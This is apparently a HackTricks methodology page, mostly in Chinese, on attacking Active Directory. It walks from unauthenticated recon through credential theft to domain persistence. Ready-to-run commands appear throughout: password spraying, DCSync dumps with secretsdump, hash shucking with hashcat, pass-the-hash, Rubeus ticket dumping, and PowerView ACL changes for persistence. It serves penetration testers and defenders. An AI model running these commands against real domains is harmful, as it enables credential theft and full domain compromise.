# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，允许**网络管理员**高效地创建和管理网络内的**域**、**用户**和**对象**。它设计为可扩展，便于将大量用户组织为可管理的**组**和**子组**，并在各个层级上控制**访问权限**。

**Active Directory** 的结构由三层主要部分组成：**domains**、**trees** 和 **forests**。一个 **domain** 包含一组共享相同数据库的对象，例如**用户**或**设备**。**trees** 是这些域按共享结构连接起来的组合，而 **forest** 则表示多个 tree 的集合，通过**trust relationships**互联，构成组织结构的最高层。在每个层级都可以指定特定的**访问**和**通信权限**。

Active Directory 的关键概念包括：

1. **Directory** – 存放与 Active Directory 对象相关的所有信息。
2. **Object** – 指目录中的实体，包括**用户**、**组**或**共享文件夹**。
3. **Domain** – 作为目录对象的容器，多个域可以共存于同一 **forest** 中，每个域维护自己的对象集合。
4. **Tree** – 共享同一根域的域组。
5. **Forest** – Active Directory 组织结构的顶层，由若干 trees 组成，并在它们之间存在 **trust relationships**。

**Active Directory Domain Services (AD DS)** 包含一系列对于集中管理和网络内通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中存储数据并管理**用户**与**域**之间的交互，包括**authentication**和**search**功能。
2. **Certificate Services** – 负责创建、分发和管理安全的**digital certificates**。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持启用目录的应用程序。
4. **Directory Federation Services** – 提供 **single-sign-on** 功能，使用户在单次会话中对多个 web 应用进行认证。
5. **Rights Management** – 通过控制对版权材料的未授权分发和使用来帮助保护版权内容。
6. **DNS Service** – 对**域名解析**至关重要。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

要学习如何**攻击 AD**，你需要非常了解 **Kerberos authentication process**。\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 备忘（Cheat Sheet）

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io) 快速查看可以运行哪些命令来枚举/利用 AD。

> [!WARNING]
> Kerberos 通信在执行操作时需要完整限定域名 (FQDN)。如果你尝试使用 IP 地址访问机器，它会使用 NTLM 而不是 Kerberos。

## Recon Active Directory (No creds/sessions)

如果你只能访问 AD 环境但没有任何凭证/会话，你可以：

- **Pentest the network:**
- 扫描网络、查找主机和开放端口，尝试**利用漏洞**或**提取凭证**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可以提供有关域内关键服务器的信息，例如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取关于如何执行这些操作的更多信息。
- **Check for null and Guest access on smb services**（这在现代 Windows 版本上通常无效）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 有关如何枚举 SMB 服务器的更详细指南可以在这里找到：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 有关如何枚举 LDAP 的更详细指南可以在这里找到（请**特别注意 anonymous access**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 通过 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 收集凭证
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问主机
- 通过**暴露**[**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 收集凭证
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html)：
- 从内部文档、社交媒体、域内的服务（主要是 web）以及公开可用资源中提取用户名/姓名。
- 如果你找到公司员工的全名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的命名规则有：_NameSurname_、_Name.Surname_、_NamSur_（每部分各 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个随机字母加 3 个随机数字（例如 abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **Anonymous SMB/LDAP enum:** 请查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求无效用户名时，服务器会使用 Kerberos error 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 响应，从而允许我们判断用户名无效。**有效用户名**将会引发 AS-REP 中的 **TGT** 响应，或返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示用户需要执行 pre-authentication。
- **No Authentication against MS-NRPC**: 使用 auth-level = 1（No authentication）对域控制器上的 MS-NRPC (Netlogon) 接口进行访问。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在不使用任何凭证的情况下检查用户或计算机是否存在。该类型的枚举由 NauthNRPC 工具实现。相关研究可以在这里找到：[here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果你在网络中发现了这些服务器之一，你也可以对其进行**用户枚举**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 和这个 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) 找到用户名列表。
>
> 但是，你应该已经在之前执行的 recon 步骤中获取到公司的员工姓名。有了名字和姓氏，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 来生成潜在的有效用户名。

### Knowing one or several usernames

好，你知道已经拥有一个有效的 username 但没有 passwords……那就尝试：

- [**ASREPRoast**](asreproast.md): 如果某个用户**没有**属性 _DONT_REQ_PREAUTH_，你可以为该用户**请求一个 AS_REP message**，该消息将包含一些由该用户密码派生后加密的数据。
- [**Password Spraying**](password-spraying.md): 对每个发现的用户尝试最**常见的密码**，也许某个用户使用了弱密码（注意密码策略！）。
- 注意你也可以对 **OWA servers** 进行 **spray**，尝试获取对用户邮件服务器的访问。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能能够通过对网络某些协议进行 **poisoning** 来 **obtain** 一些 challenge **hashes**，并对其进行 **crack**：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已成功枚举 Active Directory，你将获得 **更多的电子邮件和对网络的更好理解**。你可能能够强制执行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 来获取对 AD env 的访问。

### NetExec workspace-driven recon & relay posture checks

- 使用 **`nxcdb` workspaces** 来在每次 engagement 中保存 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下生成按协议区分的 SQLite DB（smb/mssql/winrm/ldap/etc）。使用 `proto smb|mssql|winrm` 切换视图，使用 `creds` 列出收集到的凭据。完成后手动清理敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。
- 使用 **`netexec smb <cidr>`** 快速发现子网，可显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的主机通常容易成为 **relay-prone**，而 DC 通常要求 signing。
- 直接从 NetExec 输出生成 **hostnames in /etc/hosts** 以便于定位：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 signing 阻止了 **SMB relay to the DC** 时，仍要探测 **LDAP** 的状态：`netexec ldap <dc>` 会显示 `(signing:None)` / 渠道绑定弱。一个要求 SMB signing 但禁用 LDAP signing 的 DC 仍然是可被滥用的 **relay-to-LDAP** 目标（例如用于 **SPN-less RBCD**）。

### 客户端打印机凭证 leaks → 批量域凭证验证

- 打印机/网页 UI 有时会 **在 HTML 中嵌入被掩码的管理员密码**。查看源代码/开发者工具可能会显示明文（例如 `<input value="<password>">`），从而允许通过 Basic-auth 访问扫描/打印 存储库。
- 检索到的打印任务可能包含带有每用户密码的 **明文入职文档**。在测试时保持配对一致：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### 窃取 NTLM 凭据

如果你可以使用 **null 或 guest 用户** 访问 **其他 PC 或共享**，你可以**放置文件**（例如 SCF 文件），当这些文件被以某种方式访问时，会**触发对你的 NTLM 认证**，这样你就可以**窃取**可用于破解的 **NTLM challenge**：

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已拥有的每个 NT hash 当作其他较慢格式（其密钥材料直接由 NT hash 派生）的候选密码。与其在 Kerberos RC4 ticket、NetNTLM 挑战或缓存凭据中对长口令进行暴力破解，不如把 NT hashes 提供给 Hashcat 的 NT-candidate 模式，让它验证密码重用而无需得知明文。当你在域内渗透并能收集到成千上万的当前和历史 NT hashes 时，这种方法尤其有效。

何时使用 shucking：

- 你有来自 DCSync、SAM/SECURITY dump 或凭据保险库的 NT 语料，需要测试在其他域/林中的重用情况。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM 响应或 DCC/DCC2 blob。
- 你想快速证明长、无法破解的口令被重用，并立即通过 Pass-the-Hash 进行横向行动。

该技术**不适用于**其密钥不是 NT hash 派生的加密类型（例如 Kerberos etype 17/18 AES）。如果域强制使用仅 AES，则必须回退到常规密码模式。

#### 构建 NT hash 语料库

- **DCSync/NTDS** – 使用 `secretsdump.py` 带历史选项抓取尽可能多的 NT hashes（及其历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目会大幅扩大候选池，因为 Microsoft 每个账户最多可存储 24 个以前的 hash。有关更多获取 NTDS secrets 的方法见：

{{#ref}}
dcsync.md
{{#endref}}

- **端点缓存转储** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）可提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。去重并将这些 hash 附加到同一 `nt_candidates.txt` 列表。
- **跟踪元数据** – 保留产生每个 hash 的用户名/域（即使字典仅包含十六进制）。一旦 Hashcat 打印出中标候选，匹配的 hash 会立刻告诉你哪个主体在重用密码。
- 优先选择来自同一林或受信任林的候选；这样在 shucking 时重合的概率最大。

#### Hashcat NT-candidate 模式

| Hash 类型                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate 输入**必须保持为原始 32 十六进制 NT hashes**。禁用规则引擎（不要使用 `-r`，不要使用混合模式），因为修改会破坏候选的密钥材料。
- 这些模式并非本质上更快，但 NTLM 的密钥空间（在 M3 Max 上约 ~30,000 MH/s）比 Kerberos RC4（约 ~300 MH/s）快约 100 倍。在慢格式中测试经过策划的 NT 列表要比遍历整个口令空间便宜得多。
- 始终运行 **最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是最近才加入的。
- 目前没有适用于 AS-REQ Pre-Auth 的 NT 模式，且 AES etypes（19600/19700）需要明文密码，因为它们的密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而不是原始 NT hashes。

#### 示例 – Kerberoast RC4 (mode 35300)

1. 使用低权限用户捕获目标 SPN 的 RC4 TGS（详情见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 使用你的 NT 列表对票据进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT 候选中推导出 RC4 密钥并验证 `$krb5tgs$23$...` blob。匹配即证明服务账户使用了你已有的某个 NT hash。

3. 立即通过 PtH 横向：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

你也可以在之后用 `hashcat -m 1000 <matched_hash> wordlists/` 可选地恢复明文。

#### 示例 – 缓存凭据 (mode 31600)

1. 从已攻陷的工作站转储缓存登录：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会返回已在你列表中已知的 NT hash，证明缓存用户正在重用密码。可直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）或在快速 NTLM 模式下离线暴力破解以恢复字符串。

相同的工作流也适用于 NetNTLM 挑战-响应（`-m 27000/27100`）和 DCC（`-m 31500`）。一旦识别到匹配，你可以发起 relay、SMB/WMI/WinRM PtH，或在离线用 masks/rules 重新破解 NT hash。

## 使用 凭据/会话 枚举 Active Directory

在此阶段，你需要**已经妥协了一个有效域账户的凭据或会话**。如果你拥有某些有效凭据或以域用户身份的 shell，**请记住之前提到的那些选项仍然可用来妥协其他用户**。

在开始经过认证的枚举之前，你应该了解 **Kerberos 双跳问题**。

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 枚举

妥协一个账户是开始入侵整个域的**重要一步**，因为你将能够开始 **Active Directory 枚举：**

关于 [**ASREPRoast**](asreproast.md) 你现在可以查找所有可能的易受攻击用户；关于 [**Password Spraying**](password-spraying.md) 你可以获取 **所有用户名的列表**，并尝试使用被妥协账户的密码、空密码或其他有希望的新密码。

- 你可以使用 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)，这通常更隐蔽
- 你也可以使用 [**use powerview**](../basic-powershell-for-pentesters/powerview.md) 提取更详细的信息
- 另一个用于 Active Directory 枚举的极好工具是 [**BloodHound**](bloodhound.md)。它**不太隐蔽**（取决于你使用的采集方法），但**如果你不介意**，强烈推荐尝试。查找用户可 RDP 的位置、到其他组的路径等。
- **其他自动化 AD 枚举工具有：** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD 的 DNS 记录**](ad-dns-records.md)，因为它们可能包含有趣信息。
- 可用于枚举目录的 GUI 工具是来自 SysInternal Suite 的 **AdExplorer.exe**。
- 你也可以使用 **ldapsearch** 在 LDAP 数据库中搜索字段 _userPassword_ & _unixUserPassword_，甚至 _Description_ 字段中的凭据。参见 PayloadsAllTheThings 上的 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) 了解其他方法。
- 如果你使用 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举域。
- 你也可以尝试以下自动化工具：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 非常容易获取所有域用户名（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 中，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即使本节看起来较短，它实际上是最重要的部分。点击链接（主要是 cmd、powershell、powerview 和 BloodHound 的那些），学习如何枚举域并反复练习直到熟练。在评估期间，这将是找到通往 DA 的关键时刻，或判断无法继续的决定点。

### Kerberoast

Kerberoasting 涉及获取与用户账户绑定的服务所使用的 **TGS tickets**，并在离线对其加密（基于用户密码）进行破解。

更多内容见：

{{#ref}}
kerberoast.md
{{#endref}}

### 远程连接（RDP, SSH, FTP, Win-RM 等）

一旦你获得了一些凭据，可以检查是否能访问任何 **主机**。为此，你可以使用 **CrackMapExec** 根据端口扫描尝试用不同协议连接多台服务器。

### 本地权限提升

如果你以普通域用户的凭据或会话已被妥协，并且该用户对域内的 **任一主机** 有 **访问权限**，你应尝试在本地提升权限并搜索凭据。这是因为只有获得本地管理员权限，你才能**转储其他用户**的内存（LSASS）和本地（SAM）hash。

本书中有一整页关于 [**Windows 本地权限提升**](../windows-local-privilege-escalation/index.html) 和一份 [**清单**](../checklist-windows-privilege-escalation.md)。另外，别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### 当前会话票据

在当前用户会话中找到可让你访问意外资源的 **tickets** 的可能性非常**低**，但你仍可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

如果你已经成功枚举了 Active Directory，你将获得 **更多电子邮件和对网络的更好理解**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### 在计算机共享中查找 Creds | SMB Shares

既然你拥有了一些基本凭证，你应该检查是否能**找到**任何在 AD 内**共享的有趣文件**。你可以手动完成，但这是非常枯燥重复的任务（如果发现数百个需要检查的文档则更甚）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### 窃取 NTLM Creds

如果你可以**访问其他 PCs or shares**，你可以**放置文件**（比如 SCF file），当这些文件以某种方式被访问时会 t**rigger an NTLM authentication against you**，这样你就可以**steal** **NTLM challenge** 去破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

该漏洞允许任何已认证用户**妥协域控制器**。


{{#ref}}
printnightmare.md
{{#endref}}

## 在 Active Directory 上使用特权凭证/会话进行权限提升

**对于以下技术，普通域用户不足以执行；你需要一些特殊权限/凭证来完成这些攻击。**

### Hash 提取

希望你已经成功通过 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md）、[escalating privileges locally](../windows-local-privilege-escalation/index.html) 等方式**妥协了一些本地管理员**账户。\
然后，是时候将内存和本地的所有 hashes 导出/转储了。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你拥有某个用户的 hash**，你可以用它来**impersonate**该用户。\
你需要使用一些**tool** 来**perform**那个**NTLM authentication using**该**hash**，**or**你可以创建一个新的**sessionlogon**并**inject**该**hash**到**LSASS**中，这样当任何**NTLM authentication is performed**时，那个**hash will be used.** 最后一个选项是 mimikatz 所做的。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

该攻击旨在**使用用户的 NTLM hash 请求 Kerberos tickets**，作为常见 Pass The Hash（通过 NTLM 协议）的替代方法。因此，在 **NTLM protocol is disabled** 且仅允许 **Kerberos** 作为认证协议的网络中，这种方法可能特别有用。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者**窃取用户的身份验证票证**，而不是他们的密码或哈希值。被窃取的票证随后被用来**impersonate the user**，从而在网络内获取对资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 凭证重用

如果你拥有某个**本地管理员**的**hash**或**password**，你应该尝试用它**在其他 PCs 上本地登录**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 请注意，这会产生大量**噪声**，**LAPS** 可以**缓解**它。

### MSSQL Abuse & Trusted Links

如果用户有权限**access MSSQL instances**，他可能能够利用它在 MSSQL 主机上**execute commands**（如果以 SA 身份运行）、**steal** NetNTLM **hash**，甚至执行**relay** **attack**。\
此外，如果一个 MSSQL 实例被另一个 MSSQL 实例所信任（database link），并且用户对受信任的数据库拥有权限，他将能够**use the trust relationship to execute queries also in the other instance**。这些信任关系可以链式传递，最终用户可能找到配置错误的数据库并在其中执行命令。\
**数据库之间的链接甚至跨越 forest trusts。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方的资产清单与部署套件通常会暴露可用于凭证和代码执行的强大路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被攻陷的用户可能对某些域对象拥有一些**有趣的权限**，这些权限可能允许你进行横向移动或**提权**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

在域内发现有**Spool 服务在监听**，可以被**滥用**以**获取新凭证**并**提升权限**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果**其他用户**访问**被攻陷的**机器，可能从内存中**收集凭证**，甚至**向他们的进程注入 beacons**以模拟他们。\
通常用户会通过 RDP 访问系统，下面说明如何对第三方 RDP 会话执行几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一个管理域加入计算机上**本地 Administrator 密码**的系统，确保它是**随机的**、唯一的并且经常被**更改**。这些密码存储在 Active Directory 中，访问受 ACL 控制，仅授权用户可见。拥有足够权限访问这些密码时，可以实现向其他计算机的 pivot。

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

从被攻陷机器**收集证书**可能是提升环境内权限的一种路径：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了**易受攻击的模板**，可能被滥用以提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦你获得 **Domain Admin** 或更高的 **Enterprise Admin** 权限，你可以**dump** 域数据库：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

之前讨论的一些技术可以用于持久化。\
例如你可以：

- 使用户易受 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户易受 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有某个账户的证书或能够为其请求证书**是一种非常好的持久化方式（即便该用户更改密码也能继续保持）。


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限实现持久化：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过在这些组上应用统一的 **Access Control List (ACL)** 来保护**特权组**（例如 Domain Admins 和 Enterprise Admins），以防止未经授权的更改。然而，这一功能也可能被滥用；如果攻击者修改 AdminSDHolder 的 ACL，赋予普通用户完全访问权限，该用户将获得对所有特权组的广泛控制。这个本用于保护的机制反而可能在监控不严时被用来获取非授权访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每台 **Domain Controller (DC)** 上都存在一个**本地管理员**账户。通过在此类机器上获取管理员权限，可以使用 **mimikatz** 导出本地 Administrator 的 hash。之后需要修改注册表以**启用使用该密码**，从而允许远程访问本地 Administrator 账户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以对某些特定的域对象**授予**某个**用户**一些**特殊权限**，这些权限将让该用户在未来**提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** 用于**存储**对象对另一个对象所拥有的**权限**。如果你对某个对象的 security descriptor 做出哪怕是**很小的改动**，你就能在不需要成为特权组成员的情况下获取对该对象的非常有用的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` 辅助类来创建带有 `entryTTL`/`msDS-Entry-Time-To-Die` 的短生命周期主体/GPO/DNS 记录；它们会在没有 tombstones 的情况下自删除，抹去 LDAP 证据，同时留下孤立的 SIDs、损坏的 `gPLink` 引用或缓存的 DNS 响应（例如，AdminSDHolder ACE 污染或恶意的 `gPCFileSysPath`/AD 集成 DNS 重定向）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

